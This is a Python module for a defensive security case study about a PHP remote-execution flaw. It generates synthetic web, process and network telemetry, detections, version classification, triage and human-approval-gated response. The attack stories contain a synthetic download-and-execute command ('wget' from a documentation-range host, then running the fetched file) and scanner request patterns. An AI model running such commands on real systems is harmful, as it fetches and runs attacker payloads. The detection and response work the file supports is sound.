"""PHP2Shell case study (CVE-2026-109618 and CVE-2026-109619): synthetic telemetry, detections, PHP
inventory check, triage, investigation and approval-gated response.

Everything here is synthetic and offline. Addresses come from the RFC 5737 documentation ranges
(192.0.2.0/24, 198.51.100.0/24, 203.0.113.0/24) and private ranges; no real attacker indicator appears.
Ground truth lives in `CaseData.labels` (EventId -> label) and is read only by `evaluate`, never by the
agents. See docs/case-studies/php2shell.md."""

from __future__ import annotations

import hashlib
import json
import random
import re
from dataclasses import asdict, dataclass, field
from datetime import UTC, datetime, timedelta
from functools import cache

import yaml

from aisoc import DETECTIONS, kql
from aisoc.tenants import get

T0 = datetime(2026, 3, 1, tzinfo=UTC)  # synthetic epoch, reports print relative times
TENANT = "pinecrest"
SEED = 1337
RULES_DIR = DETECTIONS / "php2shell"

# Fixed release per supported branch. Branches below 8.2 are end of life and get no fix.
FIXED = {(8, 2): 35, (8, 3): 36, (8, 4): 27, (8, 5): 12}
EOL_BELOW = (8, 2)
SCAN_UA = "php2shell-scan/109618"  # a scanner User-Agent of the kind public reports describe, used as a string only
WORKERS = ("php-fpm", "apache2", "httpd", "php")


# --------------------------------------------------------------------------- inventory classifier
def classify_version(version: str) -> str:
    """vulnerable | fixed | eol_no_patch | check_backport | unknown, for a PHP version string."""
    m = re.match(r"^\s*(\d+)\.(\d+)\.(\d+)(.*)$", version or "")
    if not m:
        return "unknown"
    major, minor, patch, rest = int(m[1]), int(m[2]), int(m[3]), m[4]
    branch = (major, minor)
    if branch < EOL_BELOW:
        return "eol_no_patch"
    if branch not in FIXED:
        return "fixed" if branch > max(FIXED) else "unknown"
    if patch >= FIXED[branch]:
        return "fixed"
    # Distributions backport fixes and keep the lower upstream number (e.g. 8.4.16-1+deb13u2).
    if re.search(r"(deb\d+u\d+|ubuntu\d|\.el\d|\+\w+\d)", rest):
        return "check_backport"
    return "vulnerable"


INVENTORY_CASES: list[tuple[str, str]] = [  # (version string, expected), hand-labelled from the fixed list
    ("8.4.26", "vulnerable"), ("8.4.27", "fixed"), ("8.4.28", "fixed"), ("8.4.0", "vulnerable"),
    ("8.5.11", "vulnerable"), ("8.5.12", "fixed"), ("8.5.0", "vulnerable"), ("8.3.35", "vulnerable"),
    ("8.3.36", "fixed"), ("8.3.4", "vulnerable"), ("8.2.34", "vulnerable"), ("8.2.35", "fixed"),
    ("8.2.10", "vulnerable"), ("8.1.31", "eol_no_patch"), ("8.0.30", "eol_no_patch"), ("7.4.33", "eol_no_patch"),
    ("5.6.40", "eol_no_patch"), ("8.6.0", "fixed"), ("9.0.1", "fixed"), ("8.4.16-1+deb13u2", "check_backport"),
    ("8.3.6-0ubuntu0.24.04.5", "check_backport"), ("8.2.13-1.el9", "check_backport"), ("8.4.27-1+deb13u1", "fixed"),
    ("", "unknown"), ("PHP/8.x", "unknown"), ("8.4", "unknown"), (" 8.4.26 ", "vulnerable"), ("8.5.12RC1", "fixed"),
    ("8.3.35-dev", "vulnerable"), ("7.2.34", "eol_no_patch"),
]  # fmt: skip


# --------------------------------------------------------------------------- synthetic telemetry
@dataclass
class CaseData:
    tables: dict[str, list[dict]] = field(default_factory=dict)
    labels: dict[str, str] = field(default_factory=dict)  # EventId -> attack:<story> | benign:<kind> | noise
    inventory: dict[str, dict] = field(default_factory=dict)  # host -> {version, internet_facing, upload_routes}

    def rows(self, t: str) -> list[dict]:
        return self.tables.setdefault(t, [])


class _Gen:
    def __init__(self, seed: int) -> None:
        self.rng = random.Random(f"{seed}:php2shell")
        self.d = CaseData()
        self.n = 0

    def add(self, table: str, ts: datetime, label: str, **cols) -> str:
        self.n += 1
        e = f"p2-e{self.n:05d}"
        self.d.labels[e] = label
        self.d.rows(table).append({"TimeGenerated": ts, **cols, "EventId": e})
        return e

    def at(self, hour: float, minute: float = 0) -> datetime:
        return T0 + timedelta(hours=hour, minutes=minute)

    def web(self, ts, host, ip, method, path, label, ua="Mozilla/5.0", ctype="", progress=False, size=600, status=200):
        return self.add("W3CIISLog", ts, label, sComputerName=host, cIP=ip, csMethod=method, csUriStem=path, csUserAgent=ua,
                        ContentType=ctype, HasUploadProgressField=progress, csBytes=size, scStatus=status)  # fmt: skip

    def proc(self, ts, host, parent, name, folder, cmd, label):
        return self.add("DeviceProcessEvents", ts, label, DeviceName=host, InitiatingProcessFileName=parent, FileName=name,
                        FolderPath=folder, ProcessCommandLine=cmd)  # fmt: skip

    def file(self, ts, host, parent, name, folder, executable, label):
        sha = hashlib.sha256(f"{host}:{folder}{name}".encode()).hexdigest()
        return self.add("DeviceFileEvents", ts, label, DeviceName=host, ActionType="FileCreated", InitiatingProcessFileName=parent,
                        FileName=name, FolderPath=folder + name, IsExecutable=executable, SHA256=sha)  # fmt: skip

    def net(self, ts, host, pname, pfolder, ip, port, label):
        return self.add("DeviceNetworkEvents", ts, label, DeviceName=host, InitiatingProcessFileName=pname,
                        InitiatingProcessFolderPath=pfolder, RemoteIP=ip, RemotePort=port)  # fmt: skip

    # -- estate ------------------------------------------------------------------------------------
    def estate(self) -> None:
        versions = ["8.4.26", "8.4.27", "8.3.35", "8.3.36", "8.2.34", "8.5.12", "8.1.31", "8.4.16-1+deb13u2", "8.5.11", "7.4.33",
                    "8.2.35", "8.4.26"]  # fmt: skip
        for i, v in enumerate(versions, 1):
            self.d.inventory[f"PCU-WEB{i:02d}"] = {"version": v, "internet_facing": i <= 9, "upload_routes": ["/upload.php"] if i % 3 == 0 else []}
        self.hosts = list(self.d.inventory)

    def noise(self) -> None:
        paths = ["/", "/index.php", "/login.php", "/rates.php", "/branches.php", "/contact.php", "/static/app.css", "/static/app.js"]
        for h in range(24):
            for _ in range(40):
                host = self.rng.choice(self.hosts)
                ts = self.at(h, self.rng.uniform(0, 59))
                ip = f"198.51.100.{self.rng.randint(1, 250)}"
                if self.rng.random() < 0.15:
                    self.web(ts, host, ip, "POST", "/login.php", "noise", ctype="application/x-www-form-urlencoded", size=180)
                else:
                    self.web(ts, host, ip, "GET", self.rng.choice(paths), "noise")
            for host in self.hosts[:6]:  # PHP session files and upload temp files are normal under /tmp
                self.file(self.at(h, self.rng.uniform(0, 59)), host, "php-fpm", f"sess_{self.rng.getrandbits(40):010x}", "/tmp/", False, "noise")
                self.net(self.at(h, self.rng.uniform(0, 59)), host, "php-fpm", "/usr/sbin/", f"10.20.0.{self.rng.randint(2, 9)}", 5432, "noise")

    # -- attack stories --------------------------------------------------------------------------
    def scan(self, story: str, ip: str, hour: float, hosts: list[str]) -> None:
        paths = ["/", "/index.php", "/info.php", "/phpinfo.php", "/test.php", "/wp-login.php", "/admin.php", "/xmlrpc.php", "/config.php"]
        for k, host in enumerate(hosts):
            for j, p in enumerate(paths):
                self.web(self.at(hour, k * 0.5 + j * 0.05), host, ip, "GET", p, f"attack:{story}", ua=SCAN_UA, status=404 if "info" in p else 200)

    def probe(self, story: str, ip: str, ts: datetime, host: str, status: int) -> None:
        self.web(ts, host, ip, "POST", "/index.php", f"attack:{story}", ua=SCAN_UA, ctype="multipart/form-data; boundary=----b0undaryD0c",
                 progress=True, size=9_400_000, status=status)  # fmt: skip

    def stories(self) -> None:
        # S1 scan only. S2 scan + failed probes (worker crashes, nothing runs). S3 failed probe against a fixed host.
        # S4 full chain on a vulnerable host. S5 full chain on the end-of-life host. S6 probe blocked at the edge.
        self.scan("s1-scan-only", "203.0.113.10", 2, self.hosts[:5])
        self.scan("s2-failed-attempt", "203.0.113.20", 4, self.hosts[:3])
        for k in range(3):
            self.probe("s2-failed-attempt", "203.0.113.20", self.at(4, 20 + k), "PCU-WEB01", 500)
        self.probe("s3-patched-target", "203.0.113.30", self.at(6), "PCU-WEB02", 413)
        for story, host, ip, hour in (("s4-compromise", "PCU-WEB03", "203.0.113.40", 9), ("s5-compromise-eol", "PCU-WEB07", "203.0.113.50", 14)):
            lab = f"attack:{story}"
            self.scan(story, ip, hour, [host])
            self.probe(story, ip, self.at(hour, 10), host, 500)
            self.probe(story, ip, self.at(hour, 11), host, 200)
            self.proc(self.at(hour, 11.2), host, "apache2", "sh", "/usr/bin/", "sh -c cd /tmp; wget -q http://192.0.2.66/nfs -O nfs", lab)
            self.file(self.at(hour, 11.3), host, "apache2", "nfs", "/tmp/", True, lab)
            self.proc(self.at(hour, 11.4), host, "apache2", "nfs", "/tmp/", "./nfs php", lab)
            self.net(self.at(hour, 11.6), host, "nfs", "/tmp/", "192.0.2.77", 443, lab)
        self.probe("s6-blocked", "203.0.113.60", self.at(17), "PCU-WEB05", 403)

    # -- benign look-alikes ----------------------------------------------------------------------
    def lookalikes(self) -> None:
        # B1 real uploads with progress tracking on routes that accept uploads
        for k in range(12):
            host = ["PCU-WEB03", "PCU-WEB06", "PCU-WEB09", "PCU-WEB12"][k % 4]
            self.web(self.at(8 + k * 0.7), host, f"198.51.100.{30 + k}", "POST", "/upload.php", "benign:real-upload",
                     ctype="multipart/form-data; boundary=----WebKitFormBoundary", progress=True, size=2_400_000)  # fmt: skip
        # B2 the authorised internal vulnerability scanner sweeping every host
        for k, host in enumerate(self.hosts):
            for j, p in enumerate(
                ["/", "/index.php", "/info.php", "/admin.php", "/config.php", "/test.php", "/xmlrpc.php", "/login.php", "/rates.php"]
            ):
                self.web(self.at(1, k * 0.4 + j * 0.03), host, "10.0.5.15", "GET", p, "benign:internal-scanner", ua="corp-vuln-scanner/4.2")
        # B3 multipart form without the progress field to a normal route (contact form attachment)
        for k in range(6):
            self.web(self.at(11 + k), "PCU-WEB04", f"198.51.100.{60 + k}", "POST", "/contact.php", "benign:contact-form",
                     ctype="multipart/form-data; boundary=----WebKitFormBoundary", size=350_000)  # fmt: skip
        # B4 image conversion: php-fpm starts ImageMagick from /usr/bin on a file in /var/www
        for k in range(5):
            self.proc(
                self.at(12 + k),
                "PCU-WEB06",
                "php-fpm",
                "convert",
                "/usr/bin/",
                "convert /var/www/media/in.png -resize 800 out.webp",
                "benign:image-convert",
            )
        # B5 a deploy job (not a web worker) runs a build tool from /tmp
        self.proc(self.at(3), "PCU-WEB02", "bash", "composer.phar", "/tmp/", "php /tmp/composer.phar install --no-dev", "benign:deploy-job")
        # B6 backup agent in /opt connects to the backup vault
        for k in range(4):
            self.net(self.at(1 + k * 6), "PCU-WEB01", "backup-agent", "/opt/backup/", "198.51.100.200", 443, "benign:backup")
        # B7 an analyst's sandbox pulls a sample into /tmp from a shell, not a web worker
        self.file(self.at(15), "PCU-WEB12", "bash", "sample.bin", "/tmp/", True, "benign:analyst-sandbox")
        # B8 php-fpm sends mail through sendmail with a /tmp spool path in the command line (a known noisy pattern)
        self.proc(
            self.at(16), "PCU-WEB04", "php-fpm", "sendmail", "/usr/sbin/", "sendmail -t -i -O QueueDirectory=/tmp/mq", "benign:sendmail-tmp-queue"
        )


@cache
def generate(seed: int = SEED) -> CaseData:
    g = _Gen(seed)
    g.estate()
    g.noise()
    g.stories()
    g.lookalikes()
    for rows in g.d.tables.values():
        rows.sort(key=lambda r: r["TimeGenerated"])
    return g.d


# --------------------------------------------------------------------------- detections
@cache
def rules() -> list[dict]:
    return yaml.safe_load((RULES_DIR / "rules.yaml").read_text())["rules"]


@dataclass(frozen=True)
class Alert:
    rule: str
    stage: str
    severity: str
    host: str
    source_ip: str
    at: datetime
    event_ids: tuple[str, ...]


def detect(data: CaseData) -> list[Alert]:
    out: list[Alert] = []
    now = T0 + timedelta(days=1)
    for r in rules():
        for row in kql.run((RULES_DIR / r["file"]).read_text(), data.tables, now):
            ids = tuple(row["EventIds"]) if "EventIds" in row else (row["EventId"],)
            host = row.get(r["host"], "") if r["host"] else ""
            out.append(Alert(r["id"], r["stage"], r["severity"], host, row.get("cIP", ""), row["TimeGenerated"], ids))
    return sorted(out, key=lambda a: (a.at, a.rule))


# --------------------------------------------------------------------------- triage and investigation
SEVERITY_ORDER = ("Informational", "Low", "Medium", "High", "Critical")


@dataclass
class Case:
    id: str
    hosts: list[str]
    sources: list[str]
    stages: list[str]
    alerts: list[Alert]
    inventory: dict[str, str] = field(default_factory=dict)
    verdict: str = ""
    severity: str = ""
    reasons: list[str] = field(default_factory=list)


def triage(alerts: list[Alert], data: CaseData) -> list[Case]:
    """Group alerts into cases: a source address joins the hosts it touched; host alerts join the host's case."""
    cases: list[Case] = []
    by_host: dict[str, Case] = {}
    by_ip: dict[str, Case] = {}
    for a in alerts:
        c = (by_host.get(a.host) if a.host else None) or (by_ip.get(a.source_ip) if a.source_ip else None)
        if c is None:
            c = Case(f"P2S-{len(cases) + 1:03d}", [], [], [], [])
            cases.append(c)
        c.alerts.append(a)
        if a.host and a.host not in c.hosts:
            c.hosts.append(a.host)
            by_host[a.host] = c
        if a.source_ip and a.source_ip not in c.sources:
            c.sources.append(a.source_ip)
            by_ip[a.source_ip] = c
        if a.stage not in c.stages:
            c.stages.append(a.stage)
    for c in cases:
        investigate(c, data)
    return cases


def investigate(c: Case, data: CaseData) -> None:
    """Verdict from evidence, never from the payload text: recon | failed_attempt | confirmed_compromise."""
    c.inventory = {h: classify_version(data.inventory[h]["version"]) for h in c.hosts if h in data.inventory}
    post = {"execution", "c2"} & set(c.stages)
    delivered = "delivery" in c.stages
    statuses = [r["scStatus"] for r in data.tables["W3CIISLog"] if r["EventId"] in {e for a in c.alerts for e in a.event_ids}
                and r["csMethod"] == "POST"]  # fmt: skip
    exposed = [h for h, s in c.inventory.items() if s in ("vulnerable", "eol_no_patch", "check_backport")]
    if post and ("c2" in c.stages or len(post) == 2):
        c.verdict, c.severity = "confirmed_compromise", "Critical"
        c.reasons.append(f"post-exploitation evidence on the host: {', '.join(sorted(post))} after the crafted POST")
    elif delivered:
        c.verdict = "failed_attempt"
        c.reasons.append(
            f"crafted POST seen (HTTP {', '.join(str(s) for s in sorted(set(statuses)))}) but no process, file or outbound evidence after it"
        )
        if exposed:
            c.severity = "High"
            c.reasons.append(f"target runs vulnerable PHP ({', '.join(f'{h} {data.inventory[h]["version"]}' for h in exposed)}): patch now")
        else:
            c.severity = "Medium"
            c.reasons.append("target PHP is on a fixed release; the attempt cannot succeed against this flaw")
    elif post:
        c.verdict, c.severity = "suspicious_host_activity", "High"
        c.reasons.append("execution evidence without a matching crafted POST; investigate as a separate intrusion")
    else:
        c.verdict, c.severity = "recon", "Low"
        c.reasons.append(f"version fingerprinting from {', '.join(c.sources)}; no exploit request followed")


# --------------------------------------------------------------------------- takedown vs patch decision
def decide(host: str, data: CaseData, compromised: bool) -> str:
    """The decision record in docs/case-studies/php2shell-decision-record.md, as code."""
    inv = data.inventory[host]
    status = classify_version(inv["version"])
    if compromised:
        return "isolate_host"
    if status == "fixed":
        return "keep_online_monitor"
    if status == "eol_no_patch":
        return "take_offline_until_migrated" if inv["internet_facing"] else "restrict_and_migrate"
    if status == "check_backport":
        return "verify_backport_then_patch"
    return "mitigate_and_patch_now" if inv["internet_facing"] else "patch_next_window"


# --------------------------------------------------------------------------- response (approval-gated)
AGENT_IDENTITIES = ("triage-agent", "investigation-agent", "response-agent")


@dataclass(frozen=True)
class Action:
    action: str
    target: str
    reason: str


@dataclass
class Plan:
    case_id: str
    actions: list[Action]

    @property
    def digest(self) -> str:
        body = json.dumps([asdict(a) for a in self.actions], sort_keys=True)
        return hashlib.sha256(f"{self.case_id}|{body}".encode()).hexdigest()[:16]


@dataclass(frozen=True)
class Approval:
    approver: str
    plan_digest: str
    approved: bool


def plan(c: Case, data: CaseData) -> Plan:
    acts: list[Action] = []
    for h in c.hosts:
        if h not in data.inventory:
            continue
        d = decide(h, data, c.verdict == "confirmed_compromise")
        if d != "keep_online_monitor":
            acts.append(Action(d, h, f"{c.verdict}; PHP {data.inventory[h]['version']} is {classify_version(data.inventory[h]['version'])}"))
    if c.verdict in ("confirmed_compromise", "failed_attempt"):
        acts += [Action("block_ip", ip, "source of the crafted POST") for ip in c.sources]
    return Plan(c.id, acts)


def execute(p: Plan, approvals: list[Approval]) -> list[dict]:
    """Dry-run executor. Runs nothing unless a listed human approver approved this exact plan digest."""
    humans = set(get(TENANT).approvers)
    ok = any(a.approved and a.approver in humans and a.approver not in AGENT_IDENTITIES and a.plan_digest == p.digest for a in approvals)
    return [{"action": a.action, "target": a.target, "status": "dry_run_executed" if ok else "awaiting_approval"} for a in p.actions]


# --------------------------------------------------------------------------- evaluation (reads labels)
def evaluate(seed: int = SEED) -> dict:
    data = generate(seed)
    alerts = detect(data)
    lab = data.labels
    tp = sum(1 for a in alerts if any(lab[e].startswith("attack:") for e in a.event_ids))
    fp_alerts = [a for a in alerts if not any(lab[e].startswith("attack:") for e in a.event_ids)]
    stories = {v for v in lab.values() if v.startswith("attack:")}
    caught = {lab[e] for a in alerts for e in a.event_ids if lab[e].startswith("attack:")}
    lookalike_kinds = sorted({v for v in lab.values() if v.startswith("benign:")})
    lookalike_fp = sorted({lab[e] for a in fp_alerts for e in a.event_ids if lab[e].startswith("benign:")})
    # event-level recall over the events the rules are meant to see (all attack rows except benign-looking GET noise)
    attack_events = {e for e, v in lab.items() if v.startswith("attack:")}
    seen = {e for a in alerts for e in a.event_ids} & attack_events
    cases = triage(alerts, data)
    expected = {"s1-scan-only": "recon", "s2-failed-attempt": "failed_attempt", "s3-patched-target": "failed_attempt",
                "s4-compromise": "confirmed_compromise", "s5-compromise-eol": "confirmed_compromise", "s6-blocked": "failed_attempt"}  # fmt: skip
    verdict_ok = 0
    for c in cases:
        st = {lab[e][7:] for a in c.alerts for e in a.event_ids if lab[e].startswith("attack:")}
        verdict_ok += len(st) == 1 and expected[next(iter(st))] == c.verdict
    inv_ok = sum(classify_version(v) == want for v, want in INVENTORY_CASES)
    plans = [plan(c, data) for c in cases]
    no_approval = [r for p in plans for r in execute(p, [])]
    agent_self = [r for p in plans for r in execute(p, [Approval("response-agent", p.digest, True)])]
    stale = [r for p in plans for r in execute(p, [Approval(get(TENANT).approvers[0], "0" * 16, True)])]
    approved = [r for p in plans for r in execute(p, [Approval(get(TENANT).approvers[0], p.digest, True)])]
    ran = lambda rs: sum(r["status"] == "dry_run_executed" for r in rs)  # noqa: E731
    return {
        "events": sum(len(r) for r in data.tables.values()),
        "alerts": len(alerts),
        "precision": tp / len(alerts) if alerts else 0.0,
        "story_recall": len(caught) / len(stories),
        "event_recall": len(seen) / len(attack_events),
        "false_positive_alerts": len(fp_alerts),
        "lookalike_kinds": len(lookalike_kinds),
        "lookalike_kinds_alerting": lookalike_fp,
        "cases": len(cases),
        "verdicts_correct": verdict_ok,
        "inventory_correct": inv_ok,
        "inventory_cases": len(INVENTORY_CASES),
        "actions_planned": len(no_approval),
        "executed_without_approval": ran(no_approval),
        "executed_with_agent_self_approval": ran(agent_self),
        "executed_with_stale_digest": ran(stale),
        "executed_with_human_approval": ran(approved),
    }


def report(seed: int = SEED) -> str:
    data = generate(seed)
    cases = triage(detect(data), data)
    lines = ["PHP2Shell case study (synthetic, offline; documentation IP ranges only)", ""]
    for c in cases:
        lines.append(f"{c.id}  {c.severity:<8} {c.verdict:<21} hosts={','.join(c.hosts) or '-'} sources={','.join(c.sources) or '-'}")
        for r in c.reasons:
            lines.append(f"         - {r}")
        for a in plan(c, data).actions:
            lines.append(f"         > {a.action} {a.target} (awaiting human approval)")
    lines += ["", "Inventory:"]
    for h, inv in data.inventory.items():
        lines.append(
            f"  {h}  PHP {inv['version']:<18} {classify_version(inv['version']):<15} {'internet' if inv['internet_facing'] else 'internal':<8} -> {decide(h, data, False)}"
        )
    m = evaluate(seed)
    lines += ["", "Measured:"]
    lines += [f"  {k}: {round(v, 3) if isinstance(v, float) else v}" for k, v in m.items()]
    return "\n".join(lines)
